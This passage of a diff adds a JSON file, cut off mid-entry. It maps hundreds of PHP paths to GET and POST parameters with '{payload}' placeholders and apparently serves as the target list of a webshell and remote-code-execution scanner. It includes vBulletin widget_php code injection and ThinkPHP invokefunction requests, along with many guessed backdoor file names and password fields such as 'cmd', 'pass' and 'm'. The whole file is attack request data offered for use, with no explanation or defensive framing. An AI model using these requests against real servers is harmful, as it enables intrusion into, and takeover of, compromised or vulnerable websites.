@@ -1,0 +1,4247 @@
+{
+    "/87e03534/admin.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/bbs.php": [
+        {
+            "post": {
+                "epass": "2dmfrb28nu3c6s9j",
+                "routestring": "ajax/render/widget_php",
+                "widgetConfig[code]": "{payload}"
+            }
+        }
+    ],
+    "/forum/index.php": [
+        {
+            "post": {
+                "epass": "2dmfrb28nu3c6s9j",
+                "routestring": "ajax/render/widget_php",
+                "widgetConfig[code]": "{payload}"
+            }
+        }
+    ],
+    "/index.php": [
+        {
+            "post": {
+                "epass": "2dmfrb28nu3c6s9j",
+                "routestring": "ajax/render/widget_php",
+                "widgetConfig[code]": "{payload}"
+            }
+        },
+        {
+            "get": {
+                "vars[1][]": "HelloThinkPHP",
+                "function": "call_user_func_array",
+                "s": "/index/\\think\\app/invokefunction",
+                "vars[0]": "md5"
+            }
+        },
+        {
+            "get": {
+                "s": "/module/action/param1/${{@{payload}}}"
+            }
+        }
+    ],
+    "/forum.php": [
+        {
+            "post": {
+                "epass": "2dmfrb28nu3c6s9j",
+                "routestring": "ajax/render/widget_php",
+                "widgetConfig[code]": "{payload}"
+            }
+        }
+    ],
+    "/forums/index.php": [
+        {
+            "post": {
+                "epass": "2dmfrb28nu3c6s9j",
+                "routestring": "ajax/render/widget_php",
+                "widgetConfig[code]": "{payload}"
+            }
+        }
+    ],
+    "/bbs/index.php": [
+        {
+            "post": {
+                "epass": "2dmfrb28nu3c6s9j",
+                "routestring": "ajax/render/widget_php",
+                "widgetConfig[code]": "{payload}"
+            }
+        }
+    ],
+    "/forums.php": [
+        {
+            "post": {
+                "epass": "2dmfrb28nu3c6s9j",
+                "routestring": "ajax/render/widget_php",
+                "widgetConfig[code]": "{payload}"
+            }
+        }
+    ],
+    "/elrekt.php": [
+        {
+            "get": {
+                "vars[1][]": "HelloThinkPHP",
+                "function": "call_user_func_array",
+                "s": "/index/\\think\\app/invokefunction",
+                "vars[0]": "md5"
+            }
+        }
+    ],
+    "/images/stories/filemga.php": [
+        {
+            "get": {
+                "ssp": "RfVbHu"
+            }
+        }
+    ],
+    "/App/": [
+        {
+            "get": {
+                "content": "{payload}"
+            }
+        }
+    ],
+    "/lang.php": [
+        {
+            "get": {
+                "f": "1"
+            }
+        }
+    ],
+    "/qq.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "QQ": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "c": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "xx": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "123": "{payload}"
+            }
+        }
+    ],
+    "/9678.php": [
+        {
+            "post": {
+                "h": "{payload}"
+            }
+        }
+    ],
+    "/xx.php": [
+        {
+            "post": {
+                "xx": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "axa": "{payload}"
+            }
+        }
+    ],
+    "/xw.php": [
+        {
+            "post": {
+                "h": "{payload}"
+            }
+        }
+    ],
+    "/xw1.php": [
+        {
+            "post": {
+                "h": "{payload}"
+            }
+        }
+    ],
+    "/my.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/w.php": [
+        {
+            "post": {
+                "leng": "{payload}"
+            }
+        }
+    ],
+    "/415.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/411.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/wc.php": [
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/444.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/s.php": [
+        {
+            "post": {
+                "leng": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        }
+    ],
+    "/ffr.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/aaa.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        }
+    ],
+    "/hhh.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/vvv.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/jjj.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/sheep.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/qaq.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/wuwu11.php": [
+        {
+            "post": {
+                "h": "{payload}"
+            }
+        }
+    ],
+    "/421.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/www.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "520": "{payload}"
+            }
+        }
+    ],
+    "/shh.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/nb.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/887.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/pp.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/xi.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/rrr.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/ooi.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/whoami.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/app.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "adc": "{payload}"
+            }
+        }
+    ],
+    "/admin1.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/98k.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/tt.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/hgx.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/605.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/11a.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/981.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/ppl.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/a411.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/bbr.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/888.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/bbv.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/tty.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/aap.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/jsc.php": [
+        {
+            "post": {
+                "guest": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "value": "{payload}"
+            }
+        }
+    ],
+    "/nnn.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/9.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/qiqi1.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/qwq.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "c": "{payload}"
+            }
+        }
+    ],
+    "/zhk.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/bbqq.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/bb.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/kpl.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/ttt.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/ack.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/bbq.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/yyy.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/jj1.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/tyrant.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/qiqi.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "520": "{payload}"
+            }
+        }
+    ],
+    "/kkl.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/7o.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/ioi.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/jsc.php.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/aa.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        }
+    ],
+    "/whoami.php.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/uuu.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "sdf": "{payload}"
+            }
+        }
+    ],
+    "/999.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/jbb.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/ddd.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/nnb.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/Alarg53.php": [
+        {
+            "post": {
+                "ajax": "true",
+                "a": "Php",
+                "p1": "{payload}"
+            }
+        }
+    ],
+    "/lapan.php": [
+        {
+            "post": {
+                "ajax": "true",
+                "a": "Php",
+                "p1": "{payload}"
+            }
+        }
+    ],
+    "/xiaodai.php": [
+        {
+            "post": {
+                "xiaodai": "{payload}"
+            }
+        }
+    ],
+    "/db.init.php": [
+        {
+            "post": {
+                "eval": "{payload}"
+            }
+        }
+    ],
+    "/db__.init.php": [
+        {
+            "post": {
+                "eval": "{payload}"
+            }
+        }
+    ],
+    "/config.php": [
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "sedate": "{payload}"
+            }
+        }
+    ],
+    "/wp-admins.php": [
+        {
+            "post": {
+                "ajax": "true",
+                "a": "Php",
+                "p1": "{payload}"
+            }
+        }
+    ],
+    "/hades.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/indax.php": [
+        {
+            "post": {
+                "t00ls": "{payload}"
+            }
+        }
+    ],
+    "/_404.php": [
+        {
+            "post": {
+                "ajax": "true",
+                "a": "Php",
+                "p1": "{payload}"
+            }
+        }
+    ],
+    "/ooo.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "sdf": "{payload}"
+            }
+        }
+    ],
+    "/edmin.php": [
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        }
+    ],
+    "/p34ky1337.php": [
+        {
+            "post": {
+                "ajax": "true",
+                "a": "Php",
+                "p1": "{payload}"
+            }
+        }
+    ],
+    "/lkio.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/db_session.init.php": [
+        {
+            "post": {
+                "eval": "{payload}"
+            }
+        }
+    ],
+    "/zmp.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/pass.php": [
+        {
+            "post": {
+                "ole777": "{payload}"
+            }
+        }
+    ],
+    "/ag.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/mmp.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/about_ver.php": [
+        {
+            "post": {
+                "0fc7746": "{payload}"
+            }
+        }
+    ],
+    "/j.php": [
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/ks1.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/a.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        }
+    ],
+    "/ze.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/lz.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/1.php": [
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "miao": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "1989": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "mmp": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "hacker": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "1337": "{payload}"
+            }
+        }
+    ],
+    "/logo.php": [
+        {
+            "post": {
+                "ppass": "{payload}"
+            }
+        }
+    ],
+    "/099.php": [
+        {
+            "post": {
+                "ajax": "true",
+                "a": "Php",
+                "p1": "{payload}"
+            }
+        }
+    ],
+    "/mm.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "d": "Assert",
+                "Arui": "{payload}"
+            }
+        }
+    ],
+    "/pk1914.php": [
+        {
+            "post": {
+                "ajax": "true",
+                "a": "Php",
+                "p1": "{payload}"
+            }
+        }
+    ],
+    "/abak.php": [
+        {
+            "post": {
+                "abak": "{payload}"
+            }
+        }
+    ],
+    "/zza.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/error.php": [
+        {
+            "post": {
+                "xiao": "{payload}"
+            }
+        }
+    ],
+    "/cc.php": [
+        {
+            "post": {
+                "123": "{payload}"
+            }
+        }
+    ],
+    "/shell.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "username": "{payload}"
+            }
+        }
+    ],
+    "/m.php": [
+        {
+            "get": {
+                "pbid": "open"
+            },
+            "post": {
+                "ajax": "true",
+                "a": "Php",
+                "p1": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/sconfig.php": [
+        {
+            "post": {
+                "piaoling": "{payload}"
+            }
+        }
+    ],
+    "/t00ls.php": [
+        {
+            "post": {
+                "t00ls": "{payload}"
+            }
+        }
+    ],
+    "/zzz.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "zz": "{payload}"
+            }
+        }
+    ],
+    "/803.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/olelist.php": [
+        {
+            "post": {
+                "akseccs": "{payload}"
+            }
+        }
+    ],
+    "/o.php": [
+        {
+            "post": {
+                "o": "{payload}"
+            }
+        }
+    ],
+    "/miao.php": [
+        {
+            "post": {
+                "miao": "{payload}"
+            }
+        }
+    ],
+    "/wsx.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/conf.php": [
+        {
+            "post": {
+                "x": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/muma.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/wanan.php": [
+        {
+            "post": {
+                "wanan": "{payload}"
+            }
+        }
+    ],
+    "/cmd.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "a123": "{payload}"
+            }
+        }
+    ],
+    "/conflg.php": [
+        {
+            "post": {
+                "conflg": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "zhangwei652": "{payload}"
+            }
+        }
+    ],
+    "/defect.php": [
+        {
+            "post": {
+                "180217": "{payload}"
+            }
+        }
+    ],
+    "/xshell.php": [
+        {
+            "post": {
+                "520": "{payload}"
+            }
+        }
+    ],
+    "/system.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/hm.php": [
+        {
+            "post": {
+                "hm": "{payload}"
+            }
+        }
+    ],
+    "/h1.php": [
+        {
+            "post": {
+                "h": "{payload}"
+            }
+        }
+    ],
+    "/aw.php": [
+        {
+            "post": {
+                "aw": "{payload}"
+            }
+        }
+    ],
+    "/lindex.php": [
+        {
+            "post": {
+                "lindex": "{payload}"
+            }
+        }
+    ],
+    "/test.php": [
+        {
+            "post": {
+                "hello": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "pass": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "d": "Assert",
+                "Arui": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "An": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "h": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/cainiao.php": [
+        {
+            "post": {
+                "23051831": "{payload}"
+            }
+        }
+    ],
+    "/mx.php": [
+        {
+            "post": {
+                "mx": "{payload}"
+            }
+        }
+    ],
+    "/sllolx.php": [
+        {
+            "post": {
+                "ajax": "true",
+                "a": "Php",
+                "p1": "{payload}"
+            }
+        }
+    ],
+    "/zuo.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/yumo.php": [
+        {
+            "post": {
+                "4875": "{payload}"
+            }
+        }
+    ],
+    "/phpstudy.php": [
+        {
+            "post": {
+                "0": "{payload}"
+            }
+        }
+    ],
+    "/ssaa.php": [
+        {
+            "post": {
+                "power": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "q": "{payload}"
+            }
+        }
+    ],
+    "/l7.php": [
+        {
+            "post": {
+                "cnm": "{payload}"
+            }
+        }
+    ],
+    "/sz.php": [
+        {
+            "post": {
+                "hm": "{payload}"
+            }
+        }
+    ],
+    "/yao.php": [
+        {
+            "post": {
+                "123456": "{payload}"
+            }
+        }
+    ],
+    "/db_desql.php": [
+        {
+            "post": {
+                "4": "{payload}"
+            }
+        }
+    ],
+    "/infoo.php": [
+        {
+            "post": {
+                "-7": "{payload}"
+            }
+        }
+    ],
+    "/aotu7.php": [
+        {
+            "post": {
+                "aotu177": "{payload}"
+            }
+        }
+    ],
+    "/1213.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/Skri.php": [
+        {
+            "post": {
+                "ajax": "true",
+                "a": "Php",
+                "p1": "{payload}"
+            }
+        }
+    ],
+    "/post.php": [
+        {
+            "post": {
+                "0o0": "{payload}"
+            }
+        }
+    ],
+    "/l6.php": [
+        {
+            "post": {
+                "cnm": "{payload}"
+            }
+        }
+    ],
+    "/mz.php": [
+        {
+            "post": {
+                "lz": "{payload}"
+            }
+        }
+    ],
+    "/zuoshou.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/feixiang.php": [
+        {
+            "post": {
+                "feixiang": "{payload}"
+            }
+        }
+    ],
+    "/xiao.php": [
+        {
+            "post": {
+                "xiao": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "wanmei": "{payload}"
+            }
+        }
+    ],
+    "/db_dataml.php": [
+        {
+            "post": {
+                "4": "{payload}"
+            }
+        }
+    ],
+    "/56.php": [
+        {
+            "post": {
+                "c": "{payload}"
+            }
+        }
+    ],
+    "/l8.php": [
+        {
+            "post": {
+                "2": "{payload}"
+            }
+        }
+    ],
+    "/ak47.php": [
+        {
+            "post": {
+                "byshanhun": "{payload}"
+            }
+        }
+    ],
+    "/aaaa.php": [
+        {
+            "post": {
+                "aaaa": "{payload}"
+            }
+        }
+    ],
+    "/ak48.php": [
+        {
+            "post": {
+                "byshanhun": "{payload}"
+            }
+        }
+    ],
+    "/ip.php": [
+        {
+            "post": {
+                "ak10": "{payload}"
+            }
+        }
+    ],
+    "/qwe.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/ak.php": [
+        {
+            "post": {
+                "ak10": "{payload}"
+            }
+        }
+    ],
+    "/phpStudy.php": [
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        }
+    ],
+    "/weixiao.php": [
+        {
+            "post": {
+                "weixiao": "{payload}"
+            }
+        }
+    ],
+    "/hh.php": [
+        {
+            "post": {
+                "pass": "{payload}"
+            }
+        }
+    ],
+    "/min.php": [
+        {
+            "post": {
+                "wanan": "{payload}"
+            }
+        }
+    ],
+    "/aotu.php": [
+        {
+            "post": {
+                "aotu177": "{payload}"
+            }
+        }
+    ],
+    "/q.php": [
+        {
+            "post": {
+                "nidie": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "q": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/webslee.php": [
+        {
+            "post": {
+                "king": "{payload}"
+            }
+        }
+    ],
+    "/pe.php": [
+        {
+            "post": {
+                "pass": "{payload}"
+            }
+        }
+    ],
+    "/wan.php": [
+        {
+            "post": {
+                "wanan": "{payload}"
+            }
+        }
+    ],
+    "/wshell.php": [
+        {
+            "post": {
+                "bbs": "{payload}"
+            }
+        }
+    ],
+    "/12.php": [
+        {
+            "post": {
+                "qiurong": "{payload}"
+            }
+        }
+    ],
+    "/bak.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/mazi.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/2.php": [
+        {
+            "post": {
+                "1989": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "123": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/python.php": [
+        {
+            "post": {
+                "q": "{payload}"
+            }
+        }
+    ],
+    "/default.php": [
+        {
+            "post": {
+                "q": "{payload}"
+            }
+        }
+    ],
+    "/sean.php": [
+        {
+            "post": {
+                "sean": "{payload}"
+            }
+        }
+    ],
+    "/sss.php": [
+        {
+            "post": {
+                "sdf": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/phpinfi.php": [
+        {
+            "post": {
+                "xiao": "{payload}"
+            }
+        }
+    ],
+    "/sha.php": [
+        {
+            "post": {
+                "sha": "{payload}"
+            }
+        }
+    ],
+    "/core.php": [
+        {
+            "post": {
+                "1989": "{payload}"
+            }
+        }
+    ],
+    "/boots.php": [
+        {
+            "post": {
+                "xiao": "{payload}"
+            }
+        }
+    ],
+    "/zshmindex.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/caonma.php": [
+        {
+            "post": {
+                "caonma": "{payload}"
+            }
+        }
+    ],
+    "/linuxse.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/she.php": [
+        {
+            "post": {
+                "pass": "{payload}"
+            }
+        }
+    ],
+    "/zuoindex.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/confg.php": [
+        {
+            "post": {
+                "5": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "4": "{payload}"
+            }
+        }
+    ],
+    "/tiandi.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/wcp.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/phpini.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/afafaf.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/zuoss.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/789056.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/qaz.php": [
+        {
+            "post": {
+                "daoen": "{payload}"
+            }
+        }
+    ],
+    "/ss.php": [
+        {
+            "post": {
+                "jies": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "ss": "{payload}"
+            }
+        }
+    ],
+    "/htfr.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/qw.php": [
+        {
+            "post": {
+                "qw": "{payload}"
+            }
+        }
+    ],
+    "/xz.php": [
+        {
+            "post": {
+                "cc1362308": "{payload}"
+            }
+        }
+    ],
+    "/4.php": [
+        {
+            "post": {
+                "321": "{payload}"
+            }
+        }
+    ],
+    "/ooo23.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/help.php": [
+        {
+            "post": {
+                "adc": "{payload}"
+            }
+        }
+    ],
+    "/9510.php": [
+        {
+            "post": {
+                "c": "{payload}"
+            }
+        }
+    ],
+    "/1hou.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/ceshi.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/zuoshss.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/3.php": [
+        {
+            "post": {
+                "321": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "zs": "{payload}"
+            }
+        }
+    ],
+    "/zuos.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/ou2.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/u.php": [
+        {
+            "post": {
+                "sdf": "{payload}"
+            }
+        }
+    ],
+    "/tomcat.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/uu.php": [
+        {
+            "post": {
+                "sdf": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "xiao": "{payload}"
+            }
+        }
+    ],
+    "/abc776.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/beimeng.php": [
+        {
+            "post": {
+                "beimeng": "{payload}"
+            }
+        }
+    ],
+    "/jyyy.php": [
+        {
+            "post": {
+                "zuo": "{payload}"
+            }
+        }
+    ],
+    "/ver.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/conf1g.php": [
+        {
+            "post": {
+                "5": "{payload}"
+            }
+        }
+    ],
+    "/hack.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "hack": "{payload}"
+            }
+        }
+    ],
+    "/qa.php": [
+        {
+            "post": {
+                "q": "{payload}"
+            }
+        }
+    ],
+    "/hell.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "pass": "{payload}"
+            }
+        }
+    ],
+    "/pma.php": [
+        {
+            "post": {
+                "mmp": "{payload}"
+            }
+        }
+    ],
+    "/xp.php": [
+        {
+            "post": {
+                "x": "{payload}"
+            }
+        }
+    ],
+    "/CC.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/xiaoma.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/qq5262.php": [
+        {
+            "post": {
+                "qq5262": "{payload}"
+            }
+        }
+    ],
+    "/xiaomae.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/z.php": [
+        {
+            "post": {
+                "123": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "z": "{payload}"
+            }
+        }
+    ],
+    "/cxfm666.php": [
+        {
+            "post": {
+                "cxfm666": "{payload}"
+            }
+        }
+    ],
+    "/xxx.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/db.php": [
+        {
+            "post": {
+                "ffdd3": "{payload}"
+            }
+        }
+    ],
+    "/admn.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/92.php": [
+        {
+            "post": {
+                "92": "{payload}"
+            }
+        }
+    ],
+    "/win.php": [
+        {
+            "post": {
+                "win": "{payload}"
+            }
+        }
+    ],
+    "/linux1.php": [
+        {
+            "post": {
+                "linux": "{payload}"
+            }
+        }
+    ],
+    "/1234.php": [
+        {
+            "post": {
+                "hacker": "{payload}"
+            }
+        }
+    ],
+    "/ruyi.php": [
+        {
+            "post": {
+                "905": "{payload}"
+            }
+        }
+    ],
+    "/xiaomar.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/lucky.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "linux": "{payload}"
+            }
+        }
+    ],
+    "/x.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "x": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "123": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "xiao": "{payload}"
+            }
+        }
+    ],
+    "/hello.php": [
